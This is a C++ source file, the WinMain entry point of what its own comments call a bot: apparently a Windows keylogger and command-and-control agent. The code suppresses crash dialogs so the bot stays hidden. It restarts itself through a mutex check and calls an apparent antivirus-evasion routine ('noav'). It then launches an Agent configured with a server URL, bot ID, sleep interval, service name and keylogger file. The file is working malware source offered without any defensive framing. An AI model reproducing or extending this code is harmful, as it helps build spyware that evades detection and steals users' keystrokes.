#include "agent.h"
#include "extern.h"

using namespace std;

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	char sysdir[MAX_PATH], fname[_MAX_FNAME], ext[_MAX_EXT], rfilename[MAX_PATH], cfilename[MAX_PATH];

#ifndef DEBUGME
	// hide system messages if bot crashes
	SetErrorMode(SEM_NOGPFAULTERRORBOX);
#else
	char* pPath;
	string keylogger_debuglog;
	pPath = getenv("TEMP");
	keylogger_debuglog.append(pPath);
	keylogger_debuglog.append("\\DEBUG_4R35.txt");
	debug_log_stream = fopen(keylogger_debuglog.c_str(), "w");

	SYSTEMTIME st, lt;

	GetSystemTime(&st);
	GetLocalTime(&lt);

	DEBUGMSGF("The system time is: %02d:%02d\n", st.wHour, st.wMinute);
	DEBUGMSGF(" The local time is: %02d:%02d\n", lt.wHour, lt.wMinute);
#endif // !DEBUGME

	DEBUGMSG("before noav");

	// First think, restart us if the Running MUTEX is not present
	HANDLE MyRunningMutex = CreateMutex(NULL, TRUE, MUTEXID_RUN);
	if (GetLastError() != ERROR_ALREADY_EXISTS) {
		ReleaseMutex(MyRunningMutex);
		WinExec(lpCmdLine, 0);
	}

	noav(FALSE);
//	noreverse();

	DEBUGMSG("after noav");

	GetSystemDirectory(sysdir, sizeof(sysdir));
	GetModuleFileName(GetModuleHandle(NULL), cfilename, sizeof(cfilename));
	_splitpath(cfilename, NULL, NULL, fname, ext);
	_snprintf(rfilename, sizeof(rfilename), "%s%s", fname, ext);

	Agent *ag = new Agent(SERVER_URL, BOT_ID, SLEEP_INTERVAL, SERVICE_NAME, USER_AGENT, KEYLOGGER_FILE);
	ag->run();

#ifdef DEBUGME
	fclose(debug_log_stream);
#endif

	return 0;
}